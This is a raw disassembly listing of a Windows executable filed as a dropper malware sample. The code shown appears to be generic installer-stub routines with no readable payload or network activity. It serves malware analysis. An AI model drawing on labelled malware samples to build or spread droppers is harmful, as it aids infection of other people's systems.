
malware_samples/dropper/280e75f791c26cebb3e92bb8e5fb840faafc4a48454b7435d335f698715ba253.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	55                   	push   %ebp
  401001:	8b ec                	mov    %esp,%ebp
  401003:	83 ec 5c             	sub    $0x5c,%esp
  401006:	83 7d 0c 0f          	cmpl   $0xf,0xc(%ebp)
  40100a:	74 2b                	je     0x401037
  40100c:	83 7d 0c 46          	cmpl   $0x46,0xc(%ebp)
  401010:	8b 45 14             	mov    0x14(%ebp),%eax
  401013:	75 0d                	jne    0x401022
  401015:	83 48 18 10          	orl    $0x10,0x18(%eax)
  401019:	8b 0d 84 a5 42 00    	mov    0x42a584,%ecx
  40101f:	89 48 04             	mov    %ecx,0x4(%eax)
  401022:	50                   	push   %eax
  401023:	ff 75 10             	push   0x10(%ebp)
  401026:	ff 75 0c             	push   0xc(%ebp)
  401029:	ff 75 08             	push   0x8(%ebp)
  40102c:	ff 15 7c 92 40 00    	call   *0x40927c
  401032:	e9 42 01 00 00       	jmp    0x401179
  401037:	53                   	push   %ebx
  401038:	56                   	push   %esi
  401039:	8b 35 8c a5 42 00    	mov    0x42a58c,%esi
  40103f:	57                   	push   %edi
  401040:	8d 45 a4             	lea    -0x5c(%ebp),%eax
  401043:	50                   	push   %eax
  401044:	ff 75 08             	push   0x8(%ebp)
  401047:	ff 15 80 92 40 00    	call   *0x409280
  40104d:	83 65 f4 00          	andl   $0x0,-0xc(%ebp)
  401051:	89 45 0c             	mov    %eax,0xc(%ebp)
  401054:	8d 45 e4             	lea    -0x1c(%ebp),%eax
  401057:	50                   	push   %eax
  401058:	ff 75 08             	push   0x8(%ebp)
  40105b:	ff 15 84 92 40 00    	call   *0x409284
  401061:	8b 7d f0             	mov    -0x10(%ebp),%edi
  401064:	83 65 f0 00          	andl   $0x0,-0x10(%ebp)
  401068:	8b 1d 50 90 40 00    	mov    0x409050,%ebx
  40106e:	e9 80 00 00 00       	jmp    0x4010f3
  401073:	0f b6 46 52          	movzbl 0x52(%esi),%eax
  401077:	0f b6 56 56          	movzbl 0x56(%esi),%edx
  40107b:	0f af 55 e8          	imul   -0x18(%ebp),%edx
  40107f:	8b cf                	mov    %edi,%ecx
  401081:	2b 4d e8             	sub    -0x18(%ebp),%ecx
  401084:	0f af c1             	imul   %ecx,%eax
  401087:	03 c2                	add    %edx,%eax
  401089:	99                   	cltd
  40108a:	f7 ff                	idiv   %edi
  40108c:	33 d2                	xor    %edx,%edx
  40108e:	89 4d 10             	mov    %ecx,0x10(%ebp)
  401091:	8a f0                	mov    %al,%dh
  401093:	0f b6 46 51          	movzbl 0x51(%esi),%eax
  401097:	0f af c1             	imul   %ecx,%eax
  40109a:	0f b6 4e 55          	movzbl 0x55(%esi),%ecx
  40109e:	0f af 4d e8          	imul   -0x18(%ebp),%ecx
  4010a2:	03 c1                	add    %ecx,%eax
  4010a4:	8b ca                	mov    %edx,%ecx
  4010a6:	99                   	cltd
  4010a7:	f7 ff                	idiv   %edi
  4010a9:	0f b6 56 54          	movzbl 0x54(%esi),%edx
  4010ad:	0f af 55 e8          	imul   -0x18(%ebp),%edx
  4010b1:	8a c8                	mov    %al,%cl
  4010b3:	0f b6 46 50          	movzbl 0x50(%esi),%eax
  4010b7:	0f af 45 10          	imul   0x10(%ebp),%eax
  4010bb:	03 c2                	add    %edx,%eax
  4010bd:	99                   	cltd
  4010be:	f7 ff                	idiv   %edi
  4010c0:	c1 e1 08             	shl    $0x8,%ecx
  4010c3:	0f b6 c0             	movzbl %al,%eax
  4010c6:	0b c8                	or     %eax,%ecx
  4010c8:	8d 45 f4             	lea    -0xc(%ebp),%eax
  4010cb:	50                   	push   %eax
  4010cc:	89 4d f8             	mov    %ecx,-0x8(%ebp)
  4010cf:	ff 15 64 90 40 00    	call   *0x409064
  4010d5:	83 45 f0 04          	addl   $0x4,-0x10(%ebp)
  4010d9:	50                   	push   %eax
  4010da:	89 45 14             	mov    %eax,0x14(%ebp)
  4010dd:	8d 45 e4             	lea    -0x1c(%ebp),%eax
  4010e0:	50                   	push   %eax
  4010e1:	ff 75 0c             	push   0xc(%ebp)
  4010e4:	ff 15 88 92 40 00    	call   *0x409288
  4010ea:	ff 75 14             	push   0x14(%ebp)
  4010ed:	ff d3                	call   *%ebx
  4010ef:	83 45 e8 04          	addl   $0x4,-0x18(%ebp)
  4010f3:	39 7d e8             	cmp    %edi,-0x18(%ebp)
  4010f6:	0f 8c 77 ff ff ff    	jl     0x401073
  4010fc:	83 7e 58 ff          	cmpl   $0xffffffff,0x58(%esi)
  401100:	74 65                	je     0x401167
  401102:	ff 76 34             	push   0x34(%esi)
  401105:	ff 15 60 90 40 00    	call   *0x409060
  40110b:	85 c0                	test   %eax,%eax
  40110d:	89 45 14             	mov    %eax,0x14(%ebp)
  401110:	74 55                	je     0x401167
  401112:	8b 7d 0c             	mov    0xc(%ebp),%edi
  401115:	6a 01                	push   $0x1
  401117:	57                   	push   %edi
  401118:	c7 45 e4 10 00 00 00 	movl   $0x10,-0x1c(%ebp)
  40111f:	c7 45 e8 08 00 00 00 	movl   $0x8,-0x18(%ebp)
  401126:	ff 15 5c 90 40 00    	call   *0x40905c
  40112c:	ff 76 58             	push   0x58(%esi)
  40112f:	57                   	push   %edi
  401130:	ff 15 58 90 40 00    	call   *0x409058
  401136:	ff 75 14             	push   0x14(%ebp)
  401139:	8b 35 54 90 40 00    	mov    0x409054,%esi
  40113f:	57                   	push   %edi
  401140:	ff d6                	call   *%esi
  401142:	68 20 08 00 00       	push   $0x820
  401147:	89 45 0c             	mov    %eax,0xc(%ebp)
  40114a:	8d 45 e4             	lea    -0x1c(%ebp),%eax
  40114d:	50                   	push   %eax
  40114e:	6a ff                	push   $0xffffffff
  401150:	68 80 95 42 00       	push   $0x429580
  401155:	57                   	push   %edi
  401156:	ff 15 8c 92 40 00    	call   *0x40928c
  40115c:	ff 75 0c             	push   0xc(%ebp)
  40115f:	57                   	push   %edi
  401160:	ff d6                	call   *%esi
  401162:	ff 75 14             	push   0x14(%ebp)
  401165:	ff d3                	call   *%ebx
  401167:	8d 45 a4             	lea    -0x5c(%ebp),%eax
  40116a:	50                   	push   %eax
  40116b:	ff 75 08             	push   0x8(%ebp)
  40116e:	ff 15 90 92 40 00    	call   *0x409290
  401174:	5f                   	pop    %edi
  401175:	5e                   	pop    %esi
  401176:	33 c0                	xor    %eax,%eax
  401178:	5b                   	pop    %ebx
  401179:	c9                   	leave
  40117a:	c2 10 00             	ret    $0x10
  40117d:	8b 4c 24 04          	mov    0x4(%esp),%ecx
  401181:	a1 a8 a5 42 00       	mov    0x42a5a8,%eax
  401186:	8b d1                	mov    %ecx,%edx
  401188:	69 d2 18 08 00 00    	imul   $0x818,%edx,%edx
  40118e:	8b 54 02 08          	mov    0x8(%edx,%eax,1),%edx
  401192:	f6 c2 02             	test   $0x2,%dl
  401195:	74 55                	je     0x4011ec
  401197:	56                   	push   %esi
  401198:	57                   	push   %edi
  401199:	8d 71 01             	lea    0x1(%ecx),%esi
  40119c:	33 ff                	xor    %edi,%edi
  40119e:	3b 35 ac a5 42 00    	cmp    0x42a5ac,%esi
  4011a4:	73 44                	jae    0x4011ea
  4011a6:	8b ce                	mov    %esi,%ecx
  4011a8:	69 c9 18 08 00 00    	imul   $0x818,%ecx,%ecx
  4011ae:	8d 44 01 08          	lea    0x8(%ecx,%eax,1),%eax
  4011b2:	53                   	push   %ebx
  4011b3:	8b 08                	mov    (%eax),%ecx
  4011b5:	f6 c1 02             	test   $0x2,%cl
  4011b8:	74 03                	je     0x4011bd
  4011ba:	47                   	inc    %edi
  4011bb:	eb 1e                	jmp    0x4011db
  4011bd:	f6 c1 04             	test   $0x4,%cl
  4011c0:	74 09                	je     0x4011cb
  4011c2:	8b cf                	mov    %edi,%ecx
  4011c4:	4f                   	dec    %edi
  4011c5:	85 c9                	test   %ecx,%ecx
  4011c7:	74 20                	je     0x4011e9
  4011c9:	eb 10                	jmp    0x4011db
  4011cb:	f6 c1 10             	test   $0x10,%cl
  4011ce:	75 0b                	jne    0x4011db
  4011d0:	8b d9                	mov    %ecx,%ebx
  4011d2:	33 da                	xor    %edx,%ebx
  4011d4:	83 e3 01             	and    $0x1,%ebx
  4011d7:	33 d9                	xor    %ecx,%ebx
  4011d9:	89 18                	mov    %ebx,(%eax)
  4011db:	46                   	inc    %esi
  4011dc:	05 18 08 00 00       	add    $0x818,%eax
  4011e1:	3b 35 ac a5 42 00    	cmp    0x42a5ac,%esi
  4011e7:	72 ca                	jb     0x4011b3
  4011e9:	5b                   	pop    %ebx
  4011ea:	5f                   	pop    %edi
  4011eb:	5e                   	pop    %esi
  4011ec:	c2 04 00             	ret    $0x4
  4011ef:	55                   	push   %ebp
  4011f0:	8b ec                	mov    %esp,%ebp
  4011f2:	51                   	push   %ecx
  4011f3:	51                   	push   %ecx
  4011f4:	8b 55 08             	mov    0x8(%ebp),%edx
  4011f7:	53                   	push   %ebx
  4011f8:	8b 1d a8 a5 42 00    	mov    0x42a5a8,%ebx
  4011fe:	56                   	push   %esi
  4011ff:	8b f2                	mov    %edx,%esi
  401201:	69 f6 18 08 00 00    	imul   $0x818,%esi,%esi
  401207:	03 f3                	add    %ebx,%esi
  401209:	8b 46 08             	mov    0x8(%esi),%eax
  40120c:	33 c9                	xor    %ecx,%ecx
  40120e:	a8 02                	test   $0x2,%al
  401210:	57                   	push   %edi
  401211:	89 4d fc             	mov    %ecx,-0x4(%ebp)
  401214:	89 4d f8             	mov    %ecx,-0x8(%ebp)
  401217:	74 0c                	je     0x401225
  401219:	39 4d 0c             	cmp    %ecx,0xc(%ebp)
  40121c:	74 07                	je     0x401225
  40121e:	83 e0 be             	and    $0xffffffbe,%eax
  401221:	89 46 08             	mov    %eax,0x8(%esi)
  401224:	42                   	inc    %edx
  401225:	3b 15 ac a5 42 00    	cmp    0x42a5ac,%edx
  40122b:	73 44                	jae    0x401271
  40122d:	8b c2                	mov    %edx,%eax
  40122f:	69 c0 18 08 00 00    	imul   $0x818,%eax,%eax
  401235:	8d 7c 18 08          	lea    0x8(%eax,%ebx,1),%edi
  401239:	8b 0f                	mov    (%edi),%ecx
  40123b:	f6 c1 02             	test   $0x2,%cl
  40123e:	8d 42 01             	lea    0x1(%edx),%eax
  401241:	74 0a                	je     0x40124d
  401243:	6a 01                	push   $0x1
  401245:	52                   	push   %edx
  401246:	e8 a4 ff ff ff       	call   0x4011ef
  40124b:	8b 0f                	mov    (%edi),%ecx
  40124d:	f6 c1 04             	test   $0x4,%cl
  401250:	75 28                	jne    0x40127a
  401252:	f6 c1 40             	test   $0x40,%cl
  401255:	74 03                	je     0x40125a
  401257:	ff 45 fc             	incl   -0x4(%ebp)
  40125a:	f6 c1 01             	test   $0x1,%cl
  40125d:	74 05                	je     0x401264
  40125f:	ff 45 fc             	incl   -0x4(%ebp)
  401262:	eb 03                	jmp    0x401267
  401264:	ff 45 f8             	incl   -0x8(%ebp)
  401267:	3b 05 ac a5 42 00    	cmp    0x42a5ac,%eax
  40126d:	8b d0                	mov    %eax,%edx
  40126f:	72 bc                	jb     0x40122d
  401271:	33 c0                	xor    %eax,%eax
  401273:	5f                   	pop    %edi
  401274:	5e                   	pop    %esi
  401275:	5b                   	pop    %ebx
  401276:	c9                   	leave
  401277:	c2 08 00             	ret    $0x8
  40127a:	83 7d fc 00          	cmpl   $0x0,-0x4(%ebp)
  40127e:	74 f3                	je     0x401273
  401280:	83 7d f8 00          	cmpl   $0x0,-0x8(%ebp)
  401284:	74 06                	je     0x40128c
  401286:	83 4e 08 40          	orl    $0x40,0x8(%esi)
  40128a:	eb e7                	jmp    0x401273
  40128c:	8b 4e 08             	mov    0x8(%esi),%ecx
  40128f:	81 e1 7f ff ff ff    	and    $0xffffff7f,%ecx
  401295:	83 c9 01             	or     $0x1,%ecx
  401298:	89 4e 08             	mov    %ecx,0x8(%esi)
  40129b:	eb d6                	jmp    0x401273
  40129d:	8b 4c 24 04          	mov    0x4(%esp),%ecx
  4012a1:	a1 a8 a5 42 00       	mov    0x42a5a8,%eax
  4012a6:	56                   	push   %esi
  4012a7:	33 f6                	xor    %esi,%esi
  4012a9:	83 f9 20             	cmp    $0x20,%ecx
  4012ac:	73 36                	jae    0x4012e4
  4012ae:	39 35 ac a5 42 00    	cmp    %esi,0x42a5ac
  4012b4:	76 2e                	jbe    0x4012e4
  4012b6:	8d 50 08             	lea    0x8(%eax),%edx
  4012b9:	57                   	push   %edi
  4012ba:	8b 02                	mov    (%edx),%eax
  4012bc:	a8 06                	test   $0x6,%al
  4012be:	75 14                	jne    0x4012d4
  4012c0:	33 ff                	xor    %edi,%edi
  4012c2:	47                   	inc    %edi
  4012c3:	d3 e7                	shl    %cl,%edi
  4012c5:	85 7a fc             	test   %edi,-0x4(%edx)
  4012c8:	74 05                	je     0x4012cf
  4012ca:	83 c8 01             	or     $0x1,%eax
  4012cd:	eb 03                	jmp    0x4012d2
  4012cf:	83 e0 fe             	and    $0xfffffffe,%eax
  4012d2:	89 02                	mov    %eax,(%edx)
  4012d4:	46                   	inc    %esi
  4012d5:	81 c2 18 08 00 00    	add    $0x818,%edx
  4012db:	3b 35 ac a5 42 00    	cmp    0x42a5ac,%esi
  4012e1:	72 d7                	jb     0x4012ba
  4012e3:	5f                   	pop    %edi
  4012e4:	5e                   	pop    %esi
  4012e5:	c2 04 00             	ret    $0x4
  4012e8:	55                   	push   %ebp
  4012e9:	8b ec                	mov    %esp,%ebp
  4012eb:	83 ec 0c             	sub    $0xc,%esp
  4012ee:	a1 8c a5 42 00       	mov    0x42a58c,%eax
  4012f3:	83 65 fc 00          	andl   $0x0,-0x4(%ebp)
  4012f7:	53                   	push   %ebx
  4012f8:	56                   	push   %esi
  4012f9:	05 94 00 00 00       	add    $0x94,%eax
  4012fe:	57                   	push   %edi
  4012ff:	8b 3d ac a5 42 00    	mov    0x42a5ac,%edi
  401305:	89 45 f8             	mov    %eax,-0x8(%ebp)
  401308:	8b 45 f8             	mov    -0x8(%ebp),%eax
  40130b:	33 db                	xor    %ebx,%ebx
  40130d:	39 18                	cmp    %ebx,(%eax)
  40130f:	74 4b                	je     0x40135c
  401311:	3b df                	cmp    %edi,%ebx
  401313:	73 45                	jae    0x40135a
  401315:	8b 35 a8 a5 42 00    	mov    0x42a5a8,%esi
  40131b:	83 c6 08             	add    $0x8,%esi
  40131e:	8b 16                	mov    (%esi),%edx
  401320:	f6 c2 06             	test   $0x6,%dl
  401323:	75 28                	jne    0x40134d
  401325:	8b 45 08             	mov    0x8(%ebp),%eax
  401328:	85 c0                	test   %eax,%eax
  40132a:	74 06                	je     0x401332
  40132c:	83 3c 98 00          	cmpl   $0x0,(%eax,%ebx,4)
  401330:	74 1b                	je     0x40134d
  401332:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  401335:	33 c0                	xor    %eax,%eax
  401337:	40                   	inc    %eax
  401338:	d3 e0                	shl    %cl,%eax
  40133a:	8b 4e fc             	mov    -0x4(%esi),%ecx
  40133d:	83 e2 01             	and    $0x1,%edx
  401340:	23 c8                	and    %eax,%ecx
  401342:	8b c1                	mov    %ecx,%eax
  401344:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  401347:	d3 e2                	shl    %cl,%edx
  401349:	3b c2                	cmp    %edx,%eax
  40134b:	75 0b                	jne    0x401358
  40134d:	43                   	inc    %ebx
  40134e:	81 c6 18 08 00 00    	add    $0x818,%esi
  401354:	3b df                	cmp    %edi,%ebx
  401356:	72 c6                	jb     0x40131e
  401358:	3b df                	cmp    %edi,%ebx
  40135a:	74 0d                	je     0x401369
  40135c:	ff 45 fc             	incl   -0x4(%ebp)
  40135f:	83 45 f8 04          	addl   $0x4,-0x8(%ebp)
  401363:	83 7d fc 20          	cmpl   $0x20,-0x4(%ebp)
  401367:	72 9f                	jb     0x401308
  401369:	8b 45 fc             	mov    -0x4(%ebp),%eax
  40136c:	5f                   	pop    %edi
  40136d:	5e                   	pop    %esi
  40136e:	5b                   	pop    %ebx
  40136f:	c9                   	leave
  401370:	c2 04 00             	ret    $0x4
  401373:	8b 44 24 04          	mov    0x4(%esp),%eax
  401377:	85 c0                	test   %eax,%eax
  401379:	7d 11                	jge    0x40138c
  40137b:	40                   	inc    %eax
  40137c:	c1 e0 0b             	shl    $0xb,%eax
  40137f:	b9 00 b0 42 00       	mov    $0x42b000,%ecx
  401384:	2b c8                	sub    %eax,%ecx
  401386:	51                   	push   %ecx
  401387:	e8 9b 50 00 00       	call   0x406427
  40138c:	c2 04 00             	ret    $0x4
  40138f:	56                   	push   %esi
  401390:	8b 74 24 08          	mov    0x8(%esp),%esi
  401394:	eb 6a                	jmp    0x401400
  401396:	8b 0d b0 a5 42 00    	mov    0x42a5b0,%ecx
  40139c:	8b c6                	mov    %esi,%eax
  40139e:	6b c0 24             	imul   $0x24,%eax,%eax
  4013a1:	03 c1                	add    %ecx,%eax
  4013a3:	83 38 01             	cmpl   $0x1,(%eax)
  4013a6:	74 5c                	je     0x401404
  4013a8:	50                   	push   %eax
  4013a9:	e8 55 02 00 00       	call   0x401603
  4013ae:	3d ff ff ff 7f       	cmp    $0x7fffffff,%eax
  4013b3:	74 55                	je     0x40140a
  4013b5:	50                   	push   %eax
  4013b6:	e8 b8 ff ff ff       	call   0x401373
  4013bb:	85 c0                	test   %eax,%eax
  4013bd:	75 04                	jne    0x4013c3
  4013bf:	40                   	inc    %eax
  4013c0:	46                   	inc    %esi
  4013c1:	eb 07                	jmp    0x4013ca
  4013c3:	48                   	dec    %eax
  4013c4:	8b ce                	mov    %esi,%ecx
  4013c6:	8b f0                	mov    %eax,%esi
  4013c8:	2b c1                	sub    %ecx,%eax
  4013ca:	83 7c 24 0c 00       	cmpl   $0x0,0xc(%esp)
  4013cf:	74 2f                	je     0x401400
  4013d1:	01 05 6c 95 42 00    	add    %eax,0x42956c
  4013d7:	6a 00                	push   $0x0
  4013d9:	ff 35 64 95 42 00    	push   0x429564
  4013df:	68 30 75 00 00       	push   $0x7530
  4013e4:	ff 35 6c 95 42 00    	push   0x42956c
  4013ea:	ff 15 68 91 40 00    	call   *0x409168
  4013f0:	50                   	push   %eax
  4013f1:	68 02 04 00 00       	push   $0x402
  4013f6:	ff 74 24 18          	push   0x18(%esp)
  4013fa:	ff 15 78 92 40 00    	call   *0x409278
  401400:	85 f6                	test   %esi,%esi
  401402:	7d 92                	jge    0x401396
  401404:	33 c0                	xor    %eax,%eax
  401406:	5e                   	pop    %esi
  401407:	c2 08 00             	ret    $0x8
  40140a:	b8 ff ff ff 7f       	mov    $0x7fffffff,%eax
  40140f:	eb f5                	jmp    0x401406
  401411:	8b 44 24 04          	mov    0x4(%esp),%eax
  401415:	8b 0d 8c a5 42 00    	mov    0x42a58c,%ecx
  40141b:	6a 00                	push   $0x0
  40141d:	ff 74 81 6c          	push   0x6c(%ecx,%eax,4)
  401421:	e8 69 ff ff ff       	call   0x40138f
  401426:	c2 04 00             	ret    $0x4
  401429:	68 68 b9 40 00       	push   $0x40b968
  40142e:	ff 74 24 08          	push   0x8(%esp)
  401432:	e8 07 3e 00 00       	call   0x40523e
  401437:	c2 04 00             	ret    $0x4
  40143a:	a1 00 b1 40 00       	mov    0x40b100,%eax
  40143f:	56                   	push   %esi
  401440:	ff 34 88             	push   (%eax,%ecx,4)
  401443:	6a 00                	push   $0x0
  401445:	e8 97 54 00 00       	call   0x4068e1
  40144a:	8b f0                	mov    %eax,%esi
  40144c:	56                   	push   %esi
  40144d:	e8 d5 4f 00 00       	call   0x406427
  401452:	0f b7 16             	movzwl (%esi),%edx
  401455:	5e                   	pop    %esi
  401456:	c3                   	ret
  401457:	85 f6                	test   %esi,%esi
  401459:	8b c6                	mov    %esi,%eax
  40145b:	7d 02                	jge    0x40145f
  40145d:	f7 d8                	neg    %eax
  40145f:	8b 15 00 b1 40 00    	mov    0x40b100,%edx
  401465:	8b c8                	mov    %eax,%ecx
  401467:	c1 f8 04             	sar    $0x4,%eax
  40146a:	57                   	push   %edi
  40146b:	83 e1 0f             	and    $0xf,%ecx
  40146e:	ff 34 8a             	push   (%edx,%ecx,4)
  401471:	c1 e0 0b             	shl    $0xb,%eax
  401474:	05 68 b1 40 00       	add    $0x40b168,%eax
  401479:	50                   	push   %eax
  40147a:	e8 62 54 00 00       	call   0x4068e1
  40147f:	85 f6                	test   %esi,%esi
  401481:	8b f8                	mov    %eax,%edi
  401483:	7d 06                	jge    0x40148b
  401485:	57                   	push   %edi
  401486:	e8 79 50 00 00       	call   0x406504
  40148b:	8b c7                	mov    %edi,%eax
  40148d:	5f                   	pop    %edi
  40148e:	c3                   	ret
  40148f:	85 c0                	test   %eax,%eax
  401491:	7c 0d                	jl     0x4014a0
  401493:	8b 0d 44 a6 42 00    	mov    0x42a644,%ecx
  401499:	8d 84 01 01 00 00 80 	lea    -0x7fffffff(%ecx,%eax,1),%eax
  4014a0:	c3                   	ret
  4014a1:	55                   	push   %ebp
  4014a2:	8b ec                	mov    %esp,%ebp
  4014a4:	51                   	push   %ecx
  4014a5:	56                   	push   %esi
  4014a6:	8d 4d fc             	lea    -0x4(%ebp),%ecx
  4014a9:	51                   	push   %ecx
  4014aa:	0d 20 00 10 00       	or     $0x100020,%eax
  4014af:	50                   	push   %eax
  4014b0:	6a 22                	push   $0x22
  4014b2:	5e                   	pop    %esi
  4014b3:	e8 9f ff ff ff       	call   0x401457
  4014b8:	50                   	push   %eax
  4014b9:	a1 00 b1 40 00       	mov    0x40b100,%eax
  4014be:	8b 40 04             	mov    0x4(%eax),%eax
  4014c1:	e8 c9 ff ff ff       	call   0x40148f
  4014c6:	50                   	push   %eax
  4014c7:	e8 68 4e 00 00       	call   0x406334
  4014cc:	f7 d8                	neg    %eax
  4014ce:	1b c0                	sbb    %eax,%eax
  4014d0:	f7 d0                	not    %eax
  4014d2:	23 45 fc             	and    -0x4(%ebp),%eax
  4014d5:	5e                   	pop    %esi
  4014d6:	c9                   	leave
  4014d7:	c3                   	ret
  4014d8:	55                   	push   %ebp
  4014d9:	8b ec                	mov    %esp,%ebp
  4014db:	81 ec 14 02 00 00    	sub    $0x214,%esp
  4014e1:	53                   	push   %ebx
  4014e2:	56                   	push   %esi
  4014e3:	8b 75 10             	mov    0x10(%ebp),%esi
  4014e6:	57                   	push   %edi
  4014e7:	8b fe                	mov    %esi,%edi
  4014e9:	8d 45 fc             	lea    -0x4(%ebp),%eax
  4014ec:	50                   	push   %eax
  4014ed:	81 e6 00 03 00 00    	and    $0x300,%esi
  4014f3:	8b c6                	mov    %esi,%eax
  4014f5:	83 c8 09             	or     $0x9,%eax
  4014f8:	50                   	push   %eax
  4014f9:	ff 75 0c             	push   0xc(%ebp)
  4014fc:	83 e7 01             	and    $0x1,%edi
  4014ff:	ff 75 08             	push   0x8(%ebp)
  401502:	e8 2d 4e 00 00       	call   0x406334
  401507:	33 db                	xor    %ebx,%ebx
  401509:	3b c3                	cmp    %ebx,%eax
  40150b:	0f 85 ab 00 00 00    	jne    0x4015bc
  401511:	f6 45 10 02          	testb  $0x2,0x10(%ebp)
  401515:	74 23                	je     0x40153a
  401517:	53                   	push   %ebx
  401518:	53                   	push   %ebx
  401519:	53                   	push   %ebx
  40151a:	53                   	push   %ebx
  40151b:	8d 45 f8             	lea    -0x8(%ebp),%eax
  40151e:	50                   	push   %eax
  40151f:	8d 85 ec fd ff ff    	lea    -0x214(%ebp),%eax
  401525:	50                   	push   %eax
  401526:	53                   	push   %ebx
  401527:	ff 75 fc             	push   -0x4(%ebp)
  40152a:	89 5d f8             	mov    %ebx,-0x8(%ebp)
  40152d:	ff 15 0c 90 40 00    	call   *0x40900c
  401533:	3d 03 01 00 00       	cmp    $0x103,%eax
  401538:	75 67                	jne    0x4015a1
  40153a:	68 05 01 00 00       	push   $0x105
  40153f:	8d 85 ec fd ff ff    	lea    -0x214(%ebp),%eax
  401545:	50                   	push   %eax
  401546:	53                   	push   %ebx
  401547:	8b 1d 08 90 40 00    	mov    0x409008,%ebx
  40154d:	eb 27                	jmp    0x401576
  40154f:	85 ff                	test   %edi,%edi
  401551:	75 4e                	jne    0x4015a1
  401553:	ff 75 10             	push   0x10(%ebp)
  401556:	8d 85 ec fd ff ff    	lea    -0x214(%ebp),%eax
  40155c:	50                   	push   %eax
  40155d:	ff 75 fc             	push   -0x4(%ebp)
  401560:	e8 73 ff ff ff       	call   0x4014d8
  401565:	85 c0                	test   %eax,%eax
  401567:	75 16                	jne    0x40157f
  401569:	68 05 01 00 00       	push   $0x105
  40156e:	8d 85 ec fd ff ff    	lea    -0x214(%ebp),%eax
  401574:	50                   	push   %eax
  401575:	57                   	push   %edi
  401576:	ff 75 fc             	push   -0x4(%ebp)
  401579:	ff d3                	call   *%ebx
  40157b:	85 c0                	test   %eax,%eax
  40157d:	74 d0                	je     0x40154f
  40157f:	ff 75 fc             	push   -0x4(%ebp)
  401582:	ff 15 04 90 40 00    	call   *0x409004
  401588:	6a 04                	push   $0x4
  40158a:	e8 bb 50 00 00       	call   0x40664a
  40158f:	85 c0                	test   %eax,%eax
  401591:	75 1e                	jne    0x4015b1
  401593:	ff 75 0c             	push   0xc(%ebp)
  401596:	ff 75 08             	push   0x8(%ebp)
  401599:	ff 15 00 90 40 00    	call   *0x409000
  40159f:	eb 1b                	jmp    0x4015bc
  4015a1:	ff 75 fc             	push   -0x4(%ebp)
  4015a4:	ff 15 04 90 40 00    	call   *0x409004
  4015aa:	b8 eb 03 00 00       	mov    $0x3eb,%eax
  4015af:	eb 0b                	jmp    0x4015bc
  4015b1:	6a 00                	push   $0x0
  4015b3:	56                   	push   %esi
  4015b4:	ff 75 0c             	push   0xc(%ebp)
  4015b7:	ff 75 08             	push   0x8(%ebp)
  4015ba:	ff d0                	call   *%eax
  4015bc:	5f                   	pop    %edi
  4015bd:	5e                   	pop    %esi
  4015be:	5b                   	pop    %ebx
  4015bf:	c9                   	leave
  4015c0:	c2 0c 00             	ret    $0xc
  4015c3:	66 83 3e 00          	cmpw   $0x0,(%esi)
  4015c7:	75 07                	jne    0x4015d0
  4015c9:	b8 eb 03 00 00       	mov    $0x3eb,%eax
  4015ce:	eb 30                	jmp    0x401600
  4015d0:	81 4c 24 08 20 00 10 	orl    $0x100020,0x8(%esp)
  4015d7:	00 
  4015d8:	8d 44 24 08          	lea    0x8(%esp),%eax
  4015dc:	50                   	push   %eax
  4015dd:	8b 44 24 08          	mov    0x8(%esp),%eax
  4015e1:	e8 a9 fe ff ff       	call   0x40148f
  4015e6:	50                   	push   %eax
  4015e7:	e8 cb 4c 00 00       	call   0x4062b7
  4015ec:	85 c0                	test   %eax,%eax
  4015ee:	74 0d                	je     0x4015fd
  4015f0:	ff 74 24 08          	push   0x8(%esp)
  4015f4:	56                   	push   %esi
  4015f5:	50                   	push   %eax
  4015f6:	e8 dd fe ff ff       	call   0x4014d8
  4015fb:	eb 03                	jmp    0x401600
  4015fd:	6a 06                	push   $0x6
  4015ff:	58                   	pop    %eax
  401600:	c2 08 00             	ret    $0x8
  401603:	55                   	push   %ebp
  401604:	8d 6c 24 8c          	lea    -0x74(%esp),%ebp
  401608:	81 ec e8 02 00 00    	sub    $0x2e8,%esp
  40160e:	8b 15 84 a5 42 00    	mov    0x42a584,%edx
  401614:	83 65 70 00          	andl   $0x0,0x70(%ebp)
  401618:	53                   	push   %ebx
  401619:	56                   	push   %esi
  40161a:	8b 75 7c             	mov    0x7c(%ebp),%esi
  40161d:	57                   	push   %edi
  40161e:	6a 09                	push   $0x9
  401620:	59                   	pop    %ecx
  401621:	8d 7d 40             	lea    0x40(%ebp),%edi
  401624:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  401626:	8b 4d 48             	mov    0x48(%ebp),%ecx
  401629:	8b 45 44             	mov    0x44(%ebp),%eax
  40162c:	8b 75 40             	mov    0x40(%ebp),%esi
  40162f:	c1 e1 0b             	shl    $0xb,%ecx
  401632:	bf 00 b0 42 00       	mov    $0x42b000,%edi
  401637:	03 cf                	add    %edi,%ecx
  401639:	89 4d 6c             	mov    %ecx,0x6c(%ebp)
  40163c:	8d 4d 44             	lea    0x44(%ebp),%ecx
  40163f:	8b d8                	mov    %eax,%ebx
  401641:	c1 e3 0b             	shl    $0xb,%ebx
  401644:	89 0d 00 b1 40 00    	mov    %ecx,0x40b100
  40164a:	8d 4e fe             	lea    -0x2(%esi),%ecx
  40164d:	03 df                	add    %edi,%ebx
  40164f:	83 f9 45             	cmp    $0x45,%ecx
  401652:	89 55 64             	mov    %edx,0x64(%ebp)
  401655:	0f 87 12 19 00 00    	ja     0x402f6d
  40165b:	ff 24 8d 83 2f 40 00 	jmp    *0x402f83(,%ecx,4)
  401662:	6a 00                	push   $0x0
  401664:	50                   	push   %eax
  401665:	e8 d4 3b 00 00       	call   0x40523e
  40166a:	b8 ff ff ff 7f       	mov    $0x7fffffff,%eax
  40166f:	e9 04 19 00 00       	jmp    0x402f78
  401674:	ff 05 54 95 42 00    	incl   0x429554
  40167a:	85 d2                	test   %edx,%edx
  40167c:	74 ec                	je     0x40166a
  40167e:	6a 00                	push   $0x0
  401680:	ff 15 40 92 40 00    	call   *0x409240
  401686:	eb e2                	jmp    0x40166a
  401688:	50                   	push   %eax
  401689:	e8 e5 fc ff ff       	call   0x401373
  40168e:	48                   	dec    %eax
  40168f:	6a 00                	push   $0x0
  401691:	50                   	push   %eax
  401692:	e8 f8 fc ff ff       	call   0x40138f
  401697:	e9 dc 18 00 00       	jmp    0x402f78
  40169c:	6a 00                	push   $0x0
  40169e:	50                   	push   %eax
  40169f:	e8 9a 3b 00 00       	call   0x40523e
  4016a4:	e9 c4 18 00 00       	jmp    0x402f6d
